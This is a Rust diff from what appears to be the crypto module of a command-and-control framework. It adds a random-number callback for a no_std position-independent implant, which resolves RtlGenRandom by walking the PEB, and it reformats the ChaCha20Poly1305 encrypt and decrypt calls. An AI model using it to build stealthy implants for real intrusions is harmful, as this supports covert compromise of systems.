@@ -17,14 +17,59 @@ pub const NONCE_LEN: usize = 12;
 /// A 32-byte symmetric key derived per session via ECDH + HKDF.
 pub type SessionKey = [u8; KEY_LEN];
 
-/// Fill 32 bytes from the OS CSPRNG. no_std-safe: uses rand_core's OsRng, which
-/// on Windows goes through RtlGenRandom (resolved via getrandom). The std build
-/// uses the same path; this just avoids the `rand/std_rng` convenience import.
+/// Fill 32 bytes from the OS CSPRNG.
+///
+/// **std build** (server/agent-dev/client): uses `rand_core::OsRng` → `getrandom`
+/// → `RtlGenRandom` via normal static linking. Works because these are regular
+/// std binaries with a normal import table.
+///
+/// **no_std build** (PIC implant cdylib): `getrandom`'s `#[link(name="advapi32")]`
+/// produces a static import-table entry that the PIC cdylib loader can't resolve
+/// → `SystemFunction036` call aborts (`0xC0000409`). So the no_std build uses a
+/// **registered CSPRNG callback**: the implant calls [`register_csprng`] during
+/// bootstrap with a PEB-walk resolver that dynamically finds `SystemFunction036`
+/// (a.k.a. `RtlGenRandom`) in `advapi32.dll` — no static linking, works on every
+/// Windows version from XP SP2 through 11 25H2 (SystemFunction036 is the documented
+/// stable entry point for the kernel CSPRNG). If no callback is registered,
+/// `random_bytes` falls back to `OsRng` (which works on std targets).
+#[cfg(feature = "std")]
 fn random_bytes(out: &mut [u8; 32]) {
-    // rand_core's OsRng is available without the rand `std` feature on Windows
-    // (getrandom provides the backend). Fall back to a compile-time error if
-    // neither backend is present.
     rand_core::OsRng.fill_bytes(out);
+}
+
+/// Registered CSPRNG callback for the no_std PIC implant. Set by the implant's
+/// bootstrap via [`register_csprng`]. Stores a raw function pointer in an
+/// AtomicUsize (no_std-safe, no Mutex needed — set once at init, read forever).
+#[cfg(not(feature = "std"))]
+static CSPRNG_HOOK: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
+
+/// Register a CSPRNG fill function for the no_std build. The implant calls this
+/// once during bootstrap, passing a closure that resolves `SystemFunction036`
+/// via PEB walk and fills the buffer with cryptographically-secure random bytes.
+/// Returning `false` = failure (the caller should abort / treat as fatal).
+///
+/// **Safety**: `fill` must be safe to call from any thread (the CSPRNG is
+/// stateless / thread-safe on Windows). The pointer is stored in an atomic and
+/// never freed — it must point to a function that lives for the process lifetime.
+#[cfg(not(feature = "std"))]
+pub fn register_csprng(fill: fn(&mut [u8]) -> bool) {
+    CSPRNG_HOOK.store(fill as usize, core::sync::atomic::Ordering::Release);
+}
+
+#[cfg(not(feature = "std"))]
+fn random_bytes(out: &mut [u8; 32]) {
+    let hook = CSPRNG_HOOK.load(core::sync::atomic::Ordering::Acquire);
+    if hook != 0 {
+        // SAFETY: the pointer was stored by register_csprng and points to a
+        // process-lifetime fn(&mut [u8]) -> bool. Thread-safe (CSPRNG is
+        // stateless on Windows).
+        let f: fn(&mut [u8]) -> bool = unsafe { core::mem::transmute(hook) };
+        f(out);
+    } else {
+        // Fallback: OsRng (works on std targets; on no_std without a registered
+        // hook this will use getrandom's static link — may abort on PIC cdylib).
+        rand_core::OsRng.fill_bytes(out);
+    }
 }
 
 /// The team server's long-term identity keypair. The public half is baked
@@ -175,7 +220,13 @@ pub fn seal_dir(
     let nonce_bytes = nonce_for(dir, counter);
     let nonce = Nonce::from_slice(&nonce_bytes);
     cipher
-        .encrypt(nonce, Payload { msg: plaintext, aad })
+        .encrypt(
+            nonce,
+            Payload {
+                msg: plaintext,
+                aad,
+            },
+        )
         .expect("chacha20poly1305 encrypt is infallible")
 }
 
@@ -191,7 +242,13 @@ pub fn open_dir(
     let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
     let nonce_bytes = nonce_for(dir, counter);
     let nonce = Nonce::from_slice(&nonce_bytes);
-    cipher.decrypt(nonce, Payload { msg: ciphertext, aad })
+    cipher.decrypt(
+        nonce,
+        Payload {
+            msg: ciphertext,
+            aad,
+        },
+    )
 }
 
 /// Back-compat shim: seals with [`Direction::ClientToServer`]. Prefer
